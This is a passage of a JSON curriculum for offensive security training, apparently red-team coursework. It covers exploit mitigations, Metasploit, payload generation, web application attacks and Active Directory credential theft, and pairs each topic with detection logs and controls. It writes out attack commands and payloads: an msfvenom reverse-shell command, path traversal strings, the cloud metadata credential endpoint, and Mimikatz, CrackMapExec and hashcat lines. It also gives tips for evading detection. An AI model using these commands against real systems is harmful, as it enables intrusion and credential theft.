+            "Forgetting NOP sled (\\x90) between return address and shellcode for reliability"
+          ]
+        },
+        {
+          "id": "exploit-mitigations-and-bypass",
+          "title": "Modern Exploit Mitigations & Bypasses",
+          "concepts": [
+            "DEP/NX (Data Execution Prevention): marks stack and heap as non-executable — blocks shellcode on stack",
+            "ASLR (Address Space Layout Randomization): randomizes memory layout — makes hardcoded addresses unreliable",
+            "Stack canaries (/GS): places a random value between buffer and return address — overflow corruption detected",
+            "Bypassing DEP: Return-Oriented Programming (ROP) chains existing executable code gadgets (ending in RET) instead of shellcode",
+            "Bypassing ASLR: information leaks (format string, memory disclosure), non-ASLR modules, brute forcing on 32-bit",
+            "Control Flow Guard (CFG): validates indirect call targets — bypassed with known techniques"
+          ],
+          "key_facts": [
+            "DEP/NX was introduced in Windows XP SP2 (2004) and modern CPUs — marks stack/heap as NX (non-executable)",
+            "ASLR was introduced in Windows Vista (2007) — randomizes base addresses of modules, heap, and stack",
+            "ROP (Return-Oriented Programming) chains short instruction sequences (gadgets) ending in RET to bypass DEP",
+            "A gadget is typically 1-5 instructions ending in a RET (0xC3) — found using tools like ROPgadget or ropper",
+            "On 32-bit systems, ASLR entropy is low (~16 bits) making brute force feasible; 64-bit has much higher entropy"
+          ],
+          "attack_techniques": ["T1068", "T1055", "T1055.001", "T1055.004"],
+          "killchain_stage": "execution",
+          "defense_pairing": {
+            "what_blue_sees": "Exploit mitigation bypasses are harder to detect than the initial exploit. Blue team may see repeated crashes (ASLR brute force), unusual API call patterns, or memory access violations logged by Exploit Protection.",
+            "logs": ["Windows Event 1000 (application hang/crash)", "WerFault.exe crash dumps", "Sysmon Event 8 (CreateRemoteThread — injection)", "Exploit Protection event logs"],
+            "detections": ["EDR exploit protection alerts", "Sigma: repeated application crashes (ASLR brute force)", "Behavioral: unusual API call chains (ROP detection)"],
+            "controls": ["DEP/NX", "ASLR", "CFG (Control Flow Guard)", "Stack canaries", "Exploit Protection (EMET successor)", "EDR"]
+          },
+          "drills": [
+            "Use ROPgadget or ropper to extract ROP gadgets from a non-ASLR module in a lab binary",
+            "Bypass DEP on a lab target using a ROP chain to call VirtualProtect() and make the stack executable",
+            "Enable and configure Exploit Protection settings on a test application and observe the protections in action"
+          ],
+          "common_mistakes": [
+            "Assuming mitigations are enabled — always check with tools like winchecksec or checksec before attempting bypass",
+            "Building ROP chains without verifying gadget addresses (ASLR may randomize them on each run)",
+            "Forgetting that Windows system DLLs (kernel32, ntdll) are ASLR-enabled — find non-ASLR loaded modules instead"
+          ]
+        },
+        {
+          "id": "metasploit-framework",
+          "title": "Metasploit Framework Mastery",
+          "concepts": [
+            "Metasploit architecture: exploits, payloads (singles, stagers, stages), auxiliary modules, post modules, encoders",
+            "Meterpreter: in-memory payload providing interactive shell, file operations, privilege escalation, and screenshot capabilities",
+            "Key commands: search, use, set (RHOSTS, LHOST, LPORT, PAYLOAD), exploit, sessions, background",
+            "Database: workspace management, hosts/services tracking, loot and creds storage",
+            "Post-exploitation modules: hashdump, migrate, getsystem, route (pivoting), portfwd"
+          ],
+          "key_facts": [
+            "Meterpreter runs entirely in memory — does not write to disk by default (fileless)",
+            "Stager payloads (e.g., windows/meterpreter/reverse_tcp) download the full Meterpreter stage over the network",
+            "meterpreter 'migrate' command moves the payload to a more stable process (e.g., explorer.exe, svchost.exe)",
+            "meterpreter 'getsystem' attempts multiple privilege escalation techniques (named pipe impersonation, etc.)",
+            "Route and portfwd commands enable pivoting through compromised hosts to reach internal networks"
+          ],
+          "attack_techniques": ["T1059", "T1055", "T1055.001", "T1570", "T1071"],
+          "killchain_stage": "execution",
+          "defense_pairing": {
+            "what_blue_sees": "Meterpreter generates detectable network signatures (specific stager traffic patterns), creates reflective DLL injection in memory (detectable by memory scanners), and spawns child processes (detectable by Sysmon).",
+            "logs": ["Sysmon Event 8 (CreateRemoteThread — reflective injection)", "Sysmon Event 1 (meterpreter process spawning)", "Sysmon Event 3 (reverse TCP connection to LHOST)", "Network IDS signatures for Meterpreter protocol"],
+            "detections": ["Snort/Suricata rules for Meterpreter reverse TCP handshake", "EDR reflective DLL injection detection", "Sigma: meterpreter-specific process behavior", "Memory scanning for injected DLLs"],
+            "controls": ["EDR", "IDS/IPS", "Network segmentation", "Application allowlisting", "Windows Defender / AMSI"]
+          },
+          "drills": [
+            "Exploit a lab vulnerability using Metasploit, then use 'hashdump', 'getsystem', and 'migrate' for post-exploitation",
+            "Set up a pivot through a compromised host using 'route' and 'portfwd' to reach an internal network segment",
+            "Generate an encoded payload using msfvenom and deliver it via different methods (EXE, DLL, PowerShell)"
+          ],
+          "common_mistakes": [
+            "Not setting the correct architecture (x86 vs x64) for the payload — mismatch causes failure",
+            "Leaving default Meterpreter port 4444 — easily detected, use 443 or 8080 to blend with web traffic",
+            "Forgetting to migrate from the initial process — if the exploited service crashes, the session dies"
+          ]
+        },
+        {
+          "id": "shellcode-and-payload-generation",
+          "title": "Shellcode & Payload Generation",
+          "concepts": [
+            "Shellcode types: bind shell (listens on port), reverse shell (connects back to attacker), staged, stageless",
+            "msfvenom: unified tool for payload generation and encoding — replaces msfpayload and msfencode",
+            "Payload formats: raw, exe, dll, python, powershell, c, hex, vba, hta-psh",
+            "Encoding: shikata_ga_nai (polymorphic XOR), but encoding is NOT encryption — modern AV detects encoded payloads",
+            "Custom shellcode: writing position-independent code (PIC), avoiding null bytes, using syscall-based shellcode",
+            "Payload delivery frameworks: Donut (shellcode from .NET assemblies), sRDI (DLL to shellcode)"
+          ],
+          "key_facts": [
+            "msfvenom syntax: msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=443 -f exe -o payload.exe",
+            "Shikata_ga_nai encoder uses polymorphic XOR encoding — AV can still detect via behavioral analysis",
+            "Donut converts .NET assemblies, VBScript, and JScript into position-independent shellcode (PIC)",
+            "Stageless payloads are larger but avoid the network transfer of the stager (more stealthy on network)",
+            "Shellcode must be position-independent (no hardcoded addresses) and avoid bad characters"
+          ],
+          "attack_techniques": ["T1055", "T1027", "T1027.009", "T1059.001"],
+          "killchain_stage": "execution",
+          "defense_pairing": {
+            "what_blue_sees": "Generated payloads have known signatures detectable by AV/EDR. Blue team sees: known msfvenom patterns, encoded payload entropy, network connections to known C2 infrastructure, and behavioral indicators of Meterpreter/Cobalt Strike beacons.",
+            "logs": ["AV/EDR alerts for known payload signatures", "Sysmon Event 1 (payload execution)", "Sysmon Event 7 (DLL loading by payload)", "Network logs (C2 connection patterns)"],
+            "detections": ["YARA rules for msfvenom/Meterpreter signatures", "EDR behavioral analysis (injection, persistence)", "AMSI scanning of script-based payloads", "Network IDS for C2 protocol signatures"],
+            "controls": ["EDR/AV", "AMSI", "Application allowlisting", "Network IDS/IPS", "Payload analysis sandboxes"]
+          },
+          "drills": [
+            "Generate a reverse shell payload with msfvenom in 5 different formats (exe, dll, ps1, python, c)",
+            "Use Donut to convert a .NET assembly (e.g., Rubeus) to shellcode and execute it in memory",
+            "Write custom position-independent shellcode in assembly that executes calc.exe"
+          ],
+          "common_mistakes": [
+            "Using encoded payloads believing they bypass AV — modern AV detects behavioral patterns, not just signatures",
+            "Not accounting for bad characters when generating shellcode for specific vulnerabilities",
+            "Using default msfvenom templates that have known signatures — use custom templates or custom shellcode"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "web-application-attacks",
+      "title": "Web Application Attacks",
+      "difficulty": "intermediate",
+      "prerequisites": ["reconnaissance-and-osint", "initial-access-and-social-engineering"],
+      "objective": "Identify and exploit web application vulnerabilities including injection, broken access control, XSS, SSRF, and API security flaws, following the OWASP Top 10.",
+      "topics": [
+        {
+          "id": "injection-attacks",
+          "title": "Injection Attacks (SQLi, Command, LDAP, XPath)",
+          "concepts": [
+            "SQL Injection types: in-band (error-based, UNION-based), blind (boolean-based, time-based), out-of-band (OOB DNS exfiltration)",
+            "SQLi exploitation: sqlmap for automated exploitation, manual UNION SELECT queries, boolean-based extraction",
+            "Command injection: injecting OS commands via vulnerable input fields — semicolon (;), pipe (|), ampersand (&), backtick (`)",
+            "LDAP injection: manipulating LDAP queries by injecting special characters (*, |, &, =) in input fields",
+            "NoSQL injection: manipulating MongoDB/CouchDB queries using $ne, $gt, $regex operators",
+            "ORM injection: exploiting unsafe ORM query construction (Hibernate HQL, Django ORM)"
+          ],
+          "key_facts": [
+            "UNION-based SQLi requires matching column count: ORDER BY clause to determine columns, then UNION SELECT",
+            "sqlmap supports: --dbs (enumerate databases), --tables, --dump, --os-shell (OS command execution), --tamper (evasion)",
+            "Time-based blind SQLi uses SLEEP() (MySQL) or WAITFOR DELAY (MSSQL) to infer data character by character",
+            "Command injection characters: ; | || && & are shell separators that can chain commands",
+            "Prepared statements / parameterized queries prevent ALL SQL injection by separating code from data"
+          ],
+          "attack_techniques": ["T1190", "T1059", "T1059.004"],
+          "killchain_stage": "initial-access",
+          "defense_pairing": {
+            "what_blue_sees": "SQL injection appears as anomalous database queries (UNION SELECT, SLEEP, information_schema access). Command injection appears as unexpected OS commands spawned by the web server process. Blue team sees: WAF alerts, abnormal query patterns in DB logs, and OS commands spawned by web service accounts.",
+            "logs": ["Web server access logs (unusual query parameters)", "Database query logs (UNION, SLEEP, information_schema)", "Sysmon Event 1 (web server spawning OS commands)", "WAF alerts"],
+            "detections": ["WAF rules for SQL injection patterns (SQLmap signatures)", "Database query anomaly detection", "Sigma: web server process spawning shell commands", "EDR: command execution from web service accounts"],
+            "controls": ["WAF", "Parameterized queries / prepared statements", "Input validation (allowlist)", "Least privilege DB accounts", "Stored procedures"]
+          },
+          "drills": [
+            "Exploit a UNION-based SQLi vulnerability manually and extract all database names and tables",
+            "Use sqlmap to dump a database with --batch --dbs --dump and observe the automated extraction process",
+            "Demonstrate command injection on a vulnerable web app using various injection characters (;, |, &&, `)"
+          ],
+          "common_mistakes": [
+            "Not determining the correct number of columns for UNION-based SQLi — use ORDER BY to find the count first",
+            "Forgetting to test for blind/time-based SQLi when the application does not return error messages",
+            "Using sqlmap without understanding the underlying vulnerability — always validate manually first"
+          ]
+        },
+        {
+          "id": "xss-and-csrf",
+          "title": "Cross-Site Scripting (XSS) & Cross-Site Request Forgery",
+          "concepts": [
+            "XSS types: Stored (persistent in database), Reflected (in URL/response), DOM-based (client-side JavaScript)",
+            "XSS exploitation: cookie theft (document.cookie), keylogging, credential harvesting, browser exploitation (BeEF)",
+            "XSS bypass techniques: encoding variations, SVG vectors, JavaScript template literals, CSP bypass",
+            "CSRF: forcing an authenticated user's browser to perform an unwanted action on a trusted site",
+            "CSRF tokens: anti-CSRF measures using unpredictable tokens tied to the user session",
+            "SameSite cookie attribute: Lax, Strict, None — controls cross-site cookie sending"
+          ],
+          "key_facts": [
+            "Reflected XSS is the most common — payload travels in the URL and is reflected in the response",
+            "BeEF (Browser Exploitation Framework) hooks victims via XSS and enables browser-based attacks",
+            "Content Security Policy (CSP) header mitigates XSS by restricting script sources — bypassable if misconfigured",
+            "HttpOnly cookie flag prevents JavaScript from accessing cookies — blocks XSS-based cookie theft",
+            "CSRF requires the victim to be authenticated — CSRF tokens or SameSite cookies prevent it"
+          ],
+          "attack_techniques": ["T1059.007", "T1185", "T1550.004"],
+          "killchain_stage": "execution",
+          "defense_pairing": {
+            "what_blue_sees": "XSS attacks generate unusual JavaScript execution patterns in browser security logs, anomalous HTTP requests with script payloads in parameters, and potential session cookie exfiltration to external servers. CSRF generates unexpected state-changing requests from the victim's session.",
+            "logs": ["Web server access logs (XSS payloads in parameters)", "WAF alerts (script tag patterns)", "Proxy logs (requests to cookie exfiltration endpoints)", "Application logs (anomalous user actions from CSRF)"],
+            "detections": ["WAF XSS detection rules", "CSP violation reports", "Sigma: anomalous HTTP requests with script patterns", "Behavioral: unusual session activity indicating XSS hook"],
+            "controls": ["WAF", "Content Security Policy (CSP)", "HttpOnly cookie flag", "Input encoding/output encoding", "CSRF tokens", "SameSite cookie attribute"]
+          },
+          "drills": [
+            "Exploit a stored XSS vulnerability to steal session cookies and hijack an admin session in a lab app",
+            "Bypass a weak CSP policy using allowed domain JSONP endpoints or data: URIs",
+            "Demonstrate a CSRF attack against a vulnerable form and implement CSRF token protection"
+          ],
+          "common_mistakes": [
+            "Only testing for reflected XSS and missing stored or DOM-based XSS variants",
+            "Using basic <script>alert(1)</script> payloads — modern WAFs block these; try event handlers, SVG, etc.",
+            "Not checking HttpOnly flag on cookies — if set, XSS cannot steal cookies directly (but can still make requests)"
+          ]
+        },
+        {
+          "id": "broken-access-control",
+          "title": "Broken Access Control & Authentication Bypass",
+          "concepts": [
+            "IDOR (Insecure Direct Object Reference): accessing other users' data by manipulating object IDs in URLs",
+            "Privilege escalation: horizontal (same role, different user) and vertical (lower to higher privilege)",
+            "JWT (JSON Web Token) attacks: algorithm none bypass, weak HMAC secrets, key confusion (RS256 to HS256)",
+            "Session management flaws: predictable session IDs, session fixation, no session expiration",
+            "Path traversal: ../../../etc/passwd, ..\\..\\..\\windows\\win.ini — accessing files outside web root",
+            "OAuth misconfiguration: open redirects, scope escalation, stolen authorization codes"
+          ],
+          "key_facts": [
+            "Broken Access Control is #1 on OWASP Top 10 2021 — found in 94% of tested applications",
+            "IDOR is the most common broken access control flaw — changing /user/123 to /user/124 reveals another user's data",
+            "JWT 'alg: none' attack removes signature requirement — server must reject unsigned tokens",
+            "Path traversal payloads: ../../../../etc/passwd (Linux), ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts (Windows)",
+            "Forced browsing to /admin or /api/internal endpoints often reveals unauthenticated administrative functions"
+          ],
+          "attack_techniques": ["T1190", "T1078"],
+          "killchain_stage": "initial-access",
+          "defense_pairing": {
+            "what_blue_sees": "Broken access control exploitation appears as one user accessing resources belonging to another — anomalous resource access patterns. Blue team sees: sequential ID enumeration in access logs, unexpected privilege level changes, and access to resources outside normal patterns.",
+            "logs": ["Application access logs (sequential object ID access)", "Authentication logs (unexpected privilege level)", "API gateway logs (unusual endpoint access patterns)", "Web server logs (path traversal attempts)"],
+            "detections": ["Behavioral: anomalous resource access by user", "WAF rules for path traversal patterns", "API gateway rate limiting and access pattern monitoring", "UEBA: unusual access patterns"],
+            "controls": ["Server-side authorization checks on every request", "Indirect object references (map user to allowed IDs)", "RBAC/ABAC enforcement", "Input validation for path traversal", "Session management best practices"]
+          },
+          "drills": [
+            "Exploit an IDOR vulnerability in a lab application by incrementing object IDs and accessing other users' data",
+            "Crack a weak JWT HMAC secret using hashcat or jwt_tool and forge a new token with elevated privileges",
+            "Demonstrate path traversal to read /etc/passwd or win.ini from a vulnerable file download endpoint"
+          ],
+          "common_mistakes": [
+            "Only testing access control with the same user — always test with multiple privilege levels",
+            "Assuming client-side authorization (hiding buttons) is sufficient — server must validate every request",
+            "Not testing API endpoints separately — APIs often have weaker access control than web UIs"
+          ]
+        },
+        {
+          "id": "ssrf-and-server-side",
+          "title": "SSRF & Server-Side Attacks",
+          "concepts": [
+            "SSRF: server makes HTTP requests to attacker-controlled URLs — access internal services, cloud metadata",
+            "Cloud metadata exploitation: AWS IMDSv1 at 169.254.169.254/latest/meta-data/ — steal IAM credentials",
+            "SSRF bypass techniques: DNS rebinding, URL scheme variations (gopher://, file://, dict://), IP encoding (decimal, octal)",
+            "Blind SSRF: no response visible — use out-of-band (OOB) DNS callbacks to confirm exploitation",
+            "XXE (XML External Entity): injecting malicious XML entities to read files, SSRF, or DoS"
+          ],
+          "key_facts": [
+            "AWS Instance Metadata Service v1 (IMDSv1) at 169.254.169.254 returns IAM credentials with no authentication — IMDSv2 requires a token",
+            "SSRF is #10 on OWASP Top 10 2021 (new entry) — SSRF attacks surged 452% in 2024",
+            "Gopher:// protocol can send arbitrary TCP data — enables SSRF to Redis, MySQL, SMTP, and other services",
+            "Blind SSRF is confirmed using collaborator/dnslog services that log DNS/HTTP callbacks from the target",
+            "XXE is addressed in OWASP Top 10 under A05 Security Misconfiguration when XML parsers allow external entities"
+          ],
+          "attack_techniques": ["T1190"],
+          "killchain_stage": "initial-access",
+          "defense_pairing": {
+            "what_blue_sees": "SSRF appears as the web server making requests to internal IP addresses (169.254.169.254, 10.x.x.x, 192.168.x.x) or unusual external callbacks. Blue team sees: outbound connections from web servers to internal services, AWS metadata access patterns, and DNS queries from server-side requests.",
+            "logs": ["Web server outbound connection logs", "AWS CloudTrail (metadata API calls from unexpected sources)", "Network flow logs (web server -> internal IPs)", "DNS logs (OOB callback domains)"],
+            "detections": ["Sigma: web server connecting to 169.254.169.254", "AWS GuardDuty: metadata service access from non-IMDS sources", "Network IDS: web server initiating internal connections", "WAF: SSRF patterns in URL parameters"],
+            "controls": ["IMDSv2 enforcement (token-based)", "Network segmentation (web servers isolated from internal services)", "URL allowlisting on server-side HTTP requests", "Disable unused URL schemes (gopher, file, dict)"]
+          },
+          "drills": [
+            "Exploit an SSRF vulnerability to access AWS metadata and extract IAM credentials, then use them with the AWS CLI",
+            "Use Burp Collaborator or interactsh to detect blind SSRF via OOB DNS callbacks",
+            "Exploit an XXE vulnerability to read /etc/passwd from a vulnerable XML parser"
+          ],
+          "common_mistakes": [
+            "Not trying internal IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) after external SSRF is confirmed",
+            "Forgetting to try alternative URL schemes (gopher://, file://) that may bypass URL filters",
+            "Not testing cloud metadata endpoints — SSRF to 169.254.169.254 is a critical finding in cloud environments"
+          ]
+        },
+        {
+          "id": "owasp-api-security",
+          "title": "OWASP API Security Top 10",
+          "concepts": [
+            "API1: Broken Object Level Authorization (BOLA) — accessing other users' objects via ID manipulation",
+            "API2: Broken Authentication — weak token generation, no expiration, JWT vulnerabilities",
+            "API3: Broken Object Property Level Authorization — mass assignment and excessive data exposure",
+            "API4: Unrestricted Resource Consumption — no rate limiting, large payload DoS",
+            "API5: Broken Function Level Authorization — accessing admin endpoints as regular user",
+            "API6-10: SSRF, Security Misconfiguration, Vulnerable Components, Improper Inventory, Unsafe API Consumption"
+          ],
+          "key_facts": [
+            "BOLA (API1) is the #1 API security risk — APIs expose object IDs that attackers can enumerate",
+            "Mass assignment (API3): sending extra fields like {'role':'admin'} in a user update request — backend blindly accepts",
+            "GraphQL APIs introduce unique risks: introspection enabled, batch query DoS, nested query depth attacks",
+            "Old API versions (v1, v2) are often left running with known vulnerabilities while v3 is patched",
+            "Postman and Burp Suite are primary tools for API security testing"
+          ],
+          "attack_techniques": ["T1190"],
+          "killchain_stage": "initial-access",
+          "defense_pairing": {
+            "what_blue_sees": "API attacks generate high-volume automated requests, access to objects/resources outside normal patterns, and authentication anomalies. Blue team sees: unusual API call patterns, sequential object ID enumeration, mass assignment attempts (unexpected fields), and rate-limit violations.",
+            "logs": ["API gateway logs (endpoint access, authorization failures)", "Application logs (unexpected field values — mass assignment)", "WAF logs (API abuse patterns)", "Rate limiting logs"],
+            "detections": ["API gateway anomaly detection", "Behavioral: unusual object access patterns", "Sigma: mass assignment field patterns", "Rate limiting alerts"],
+            "controls": ["API gateway with rate limiting", "Server-side authorization on every object access", "Input validation (allowlist fields)", "API versioning with deprecation", "OAuth 2.1 / OIDC authentication", "GraphQL query depth/complexity limits"]
+          },
+          "drills": [
+            "Exploit BOLA by manipulating object IDs in API requests to access another user's account data",
+            "Perform a mass assignment attack by adding 'is_admin': true to a user profile update request",
+            "Use Postman/Burp to enumerate and test all endpoints of a lab REST API for authorization flaws"
+          ],
+          "common_mistakes": [
+            "Testing APIs without authentication tokens — always test with authenticated sessions to find authz flaws",
+            "Ignoring GraphQL/REST variant APIs — each has unique security considerations",
+            "Not testing old API versions (v1, v2) that may still be accessible and unpatched"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "active-directory-and-credentials",
+      "title": "Active Directory & Credential Attacks",
+      "difficulty": "advanced",
+      "prerequisites": ["exploitation-fundamentals", "initial-access-and-social-engineering"],
+      "objective": "Enumerate, attack, and compromise Active Directory environments using advanced credential theft techniques including Kerberoasting, AS-REP roasting, credential dumping, pass-the-hash, pass-the-ticket, DCSync, and NTLM relay attacks.",
+      "topics": [
+        {
+          "id": "ad-enumeration-and-bloodhound",
+          "title": "Active Directory Enumeration & BloodHound",
+          "concepts": [
+            "AD enumeration tools: PowerView, SharpView, BloodHound/SharpHound, ADRecon, PingCastle",
+            "BloodHound: graph database (Neo4j) mapping AD relationships — users, groups, computers, sessions, ACLs",
+            "SharpHound: C# collector that queries AD via LDAP and SMB to populate BloodHound's graph database",
+            "Key queries: Shortest Path to Domain Admin, Find All Domain Admins, Shortest Path to High Value Targets",
+            "Custom Cypher queries in BloodHound for finding specific attack paths and ACL abuse opportunities"
+          ],
+          "key_facts": [
+            "BloodHound uses graph theory to reveal hidden attack paths that manual enumeration would miss",
+            "SharpHound collects: users, groups, computers, sessions, ACLs, GPOs, OUs, trusts, and container objects",
+            "BloodHound 'Shortest Paths to Domain Admins' is the most important query — reveals the easiest compromise path",
+            "Common AD misconfigurations visible in BloodHound: GenericAll, WriteDacl, WriteOwner, ForceChangePassword on high-value targets",
+            "PingCastle provides an AD security maturity score based on misconfigurations and risky settings"
+          ],
+          "attack_techniques": ["T1087.002", "T1018", "T1069.002", "T1087", "T1482", "T1082"],
+          "killchain_stage": "discovery",
+          "defense_pairing": {
+            "what_blue_sees": "AD enumeration via BloodHound/SharpHound generates massive LDAP query volume and SMB session enumeration. Blue team sees: anomalous LDAP query patterns (querying all users/groups/computers), high volume of SMB session enumeration (Event 4624 type 3), and SharpHound process execution.",
+            "logs": ["Windows Event 4662 (directory service access — LDAP queries)", "Windows Event 4624 (network logons for session enum)", "Sysmon Event 1 (SharpHound process execution)", "Sysmon Event 3 (LDAP/SMB connections from enumeration tools)"],
+            "detections": ["Sigma: anomalous LDAP query volume", "Sigma: SharpHound-specific LDAP query patterns", "AD audit policy for DS Access", "Wazuh/SIEM rules for AD enumeration patterns", "Canary objects (honeytokens) in AD that alert when queried"],
+            "controls": ["AD audit policy (Directory Service Access)", "Tiered administration model", "Privileged Access Management (PAM)", "LDAP query rate limiting", "Honeytoken/honeypot AD objects"]
+          },
+          "drills": [
+            "Run SharpHound against a lab AD environment and import the data into BloodHound, then find the shortest path to Domain Admin",
+            "Write a custom Cypher query in BloodHound to find all users with GenericAll permissions on Domain Admins group",
+            "Use PingCastle to generate a security assessment report for the lab AD environment"
+          ],
+          "common_mistakes": [
+            "Running SharpHound without understanding that it is extremely noisy and will be detected by any SIEM",
+            "Only looking at 'Shortest Path to Domain Admin' — also check for paths to other high-value targets (Exchange, SQL, backup servers)",
+            "Not analyzing ACL-based attack paths — GenericAll, WriteDacl, and ForceChangePassword are extremely powerful"
+          ]
+        },
+        {
+          "id": "kerberoasting-and-asrep-roasting",
+          "title": "Kerberoasting & AS-REP Roasting",
+          "concepts": [
+            "Kerberoasting (T1558.003): requesting TGS tickets for service accounts, then cracking the encrypted portion offline",
+            "AS-REP Roasting (T1558.004): targeting accounts with 'Do not require Kerberos preauthentication' set — request AS-REP and crack offline",
+            "Tools: Rubeus (C#), Impacket's GetUserSPNs.py (Python), PowerView's Invoke-Kerberoast",
+            "Cracking: hashcat mode 13100 (Kerberoasting), 18200 (AS-REP Roasting) — service account passwords are often weak",
+            "Mitigation: use Group Managed Service Accounts (gMSA) with long random passwords, or disable pre-auth requirement"
+          ],
+          "key_facts": [
+            "Kerberoasting requires NO special privileges — any authenticated domain user can request TGS tickets for any SPN",
+            "AS-REP Roasting targets accounts with 'Does not require preauth' set — this is a misconfiguration",
+            "hashcat -m 13100 hashes.txt wordlist.txt cracks Kerberoast hashes — service account passwords are frequently crackable",
+            "TGS tickets use RC4-HMAC (weak) or AES-256 encryption — RC4 is easier to crack; AES requires much stronger passwords",
+            "Rubeus kerberoast command requests TGS tickets for all SPN-enabled accounts and outputs crackable hashes"
+          ],
+          "attack_techniques": ["T1558.003", "T1558.004", "T1003"],
+          "killchain_stage": "credential-access",
+          "defense_pairing": {
+            "what_blue_sees": "Kerberoasting generates Event 4769 (Kerberos service ticket request) for multiple SPNs in a short time. AS-REP roasting generates Event 4768 (Kerberos authentication ticket request) with pre-authentication failures. Both are detectable via volume and patterns.",
+            "logs": ["Windows Event 4769 (Kerberos TGS request — Kerberoasting)", "Windows Event 4768 (Kerberos TGT request — AS-REP roasting)", "Sysmon Event 1 (Rubeus/Impacket process execution)"],
+            "detections": ["Sigma: multiple Event 4769 requests in short timeframe", "Sigma: RC4-HMAC encryption type in TGS requests (downgrade)", "Sigma: Event 4768 with pre-auth type 0 (AS-REP roasting)", "EDR detection of Rubeus/Impacket"],
+            "controls": ["Group Managed Service Accounts (gMSA) with 120-char random passwords", "Strong service account passwords (25+ characters)", "Disable 'Do not require preauth' on all accounts", "AES encryption enforcement for Kerberos"]
+          },
+          "drills": [
+            "Use Rubeus to perform Kerberoasting in a lab AD and crack the hashes with hashcat -m 13100",
+            "Use Impacket's GetUserSPNs.py to extract Kerberoast hashes remotely without being on a domain-joined machine",
+            "Identify accounts with pre-authentication disabled and perform AS-REP roasting using Rubeus asreproast"
+          ],
+          "common_mistakes": [
+            "Not checking the encryption type — RC4 hashes crack much faster than AES-256, prioritize them",
+            "Using weak wordlists for cracking — use rockyou.txt plus custom wordlists for service accounts",
+            "Forgetting that Kerberoasting is detectable — use it selectively, not against every SPN at once"
+          ]
+        },
+        {
+          "id": "credential-dumping",
+          "title": "Credential Dumping (LSASS, SAM, NTDS, DCSync)",
+          "concepts": [
+            "LSASS Memory dumping (T1003.001): extracting NTLM hashes, Kerberos tickets, and cleartext passwords from LSASS process",
+            "SAM database (T1003.002): dumping local account hashes from the SAM registry hive",
+            "NTDS.dit (T1003.003): extracting the Active Directory database — contains all domain password hashes",
+            "DCSync (T1003.006): simulating a Domain Controller to request password replication via MS-DRSR — extracts all domain hashes",
+            "Tools: Mimikatz (sekurlsa::logonpasswords, lsadump::dcsync), SharpSecDump, secretsdump.py (Impacket), ntdsutil",
+            "Other credential stores: LSA secrets (T1003.004), Cached domain credentials (T1003.005)"
+          ],
+          "key_facts": [
+            "Mimikatz sekurlsa::logonpasswords extracts all credentials from LSASS — requires Debug or Administrator privilege",
+            "DCSync requires Replication Get Changes (DS-Replication-Get-Changes) and Replication Get Changes All permissions — normally only DCs have these",
+            "NTDS.dit can be extracted using ntdsutil 'IFM' (Install From Media) or vssadmin volume shadow copy, then parsed with secretsdump.py",
+            "LSASS protection: RunAsPPL (Protected Process Light) prevents non-protected processes from accessing LSASS memory",
+            "Windows Defender Credential Guard uses virtualization-based security to isolate credentials in LSASS"
+          ],
+          "attack_techniques": ["T1003", "T1003.001", "T1003.002", "T1003.003", "T1003.006"],
+          "killchain_stage": "credential-access",
+          "defense_pairing": {
+            "what_blue_sees": "Credential dumping is one of the most heavily monitored attacks. Blue team sees: LSASS memory access by unauthorized processes (Mimikatz), volume shadow copy creation for NTDS extraction, DRSUAPI replication requests (DCSync), and known tool signatures.",
+            "logs": ["Windows Event 4656 (handle requested to LSASS)", "Windows Event 4662 (DCSync — DS Replication access)", "Sysmon Event 10 (process accessing LSASS.exe)", "Sysmon Event 1 (Mimikatz/secretsdump execution)", "Windows Event 4688 (ntdsutil/vssadmin execution)"],
+            "detections": ["Sigma: process accessing LSASS.exe (Sysmon Event 10)", "Sigma: Event 4662 with replication GUIDs (DCSync)", "EDR: Mimikatz signature detection", "Sigma: ntdsutil IFM creation", "Sigma: vssadmin create shadow copy"],
+            "controls": ["Windows Defender Credential Guard", "RunAsPPL (Protected Process Light)", "LSASS protection via EDR", "Restrict DCSync permissions (remove from non-DC accounts)", "LAPS for local admin password management"]
+          },
+          "drills": [
+            "Use Mimikatz to dump LSASS credentials on a lab Windows machine and identify which credential types are extractable",
+            "Perform DCSync using Mimikatz lsadump::dcsync and extract the krbtgt hash",
+            "Use Impacket's secretsdump.py to dump NTDS.dit hashes from a domain controller remotely"
+          ],
+          "common_mistakes": [
+            "Running Mimikatz without checking if RunAsPPL or Credential Guard is enabled — it will fail",
+            "Not checking if Windows Defender or EDR will block Mimikatz — use obfuscation or alternative tools",
+            "Extracting NTDS.dit while the domain controller is online without using a shadow copy — file is locked"
+          ]
+        },
+        {
+          "id": "pass-the-hash-and-pass-the-ticket",
+          "title": "Pass the Hash & Pass the Ticket",
+          "concepts": [
+            "Pass the Hash (T1550.002): authenticating with NTLM hash instead of password — NTLM protocol accepts hashes",
+            "Pass the Ticket (T1550.003): using stolen Kerberos tickets (TGT or TGS) to authenticate without password",
+            "Overpass the Hash: using an NTLM hash to request a Kerberos TGT (pass the hash then get ticket)",
+            "Tools: Mimikatz (sekurlsa::pth, kerberos::ptt), CrackMapExec/NetExec (--hashes), Impacket's psexec/wmiexec/smbexec",
+            "Golden Ticket: forging a TGT using the krbtgt hash — grants access to any service in the domain indefinitely"
+          ],
+          "key_facts": [
+            "Pass the Hash works because NTLM authentication uses the hash as the credential, not the password",
+            "NTLM hashes can be reused across all systems that accept NTLM authentication in the same domain",
+            "Golden Ticket uses krbtgt account hash to forge TGTs — valid until krbtgt password is reset (twice)",
+            "Mimikatz sekurlsa::pth /user:Administrator /domain:domain /ntlm:<hash> creates a process with the hash credential",
+            "CrackMapExec/NetExec smb <targets> -u Administrator -H <hash> enables mass lateral movement via PtH"
+          ],
+          "attack_techniques": ["T1550.002", "T1550.003", "T1550", "T1558.001"],
+          "killchain_stage": "lateral-movement",
+          "defense_pairing": {
+            "what_blue_sees": "Pass the Hash generates Event 4624 (Logon Type 3, NTLM authentication) where the user should be using Kerberos. Pass the Ticket generates unusual Kerberos events. Blue team sees: NTLM authentication where Kerberos is expected, logins from unusual systems, and Golden Ticket anomalies (ticket lifetime, encryption).",
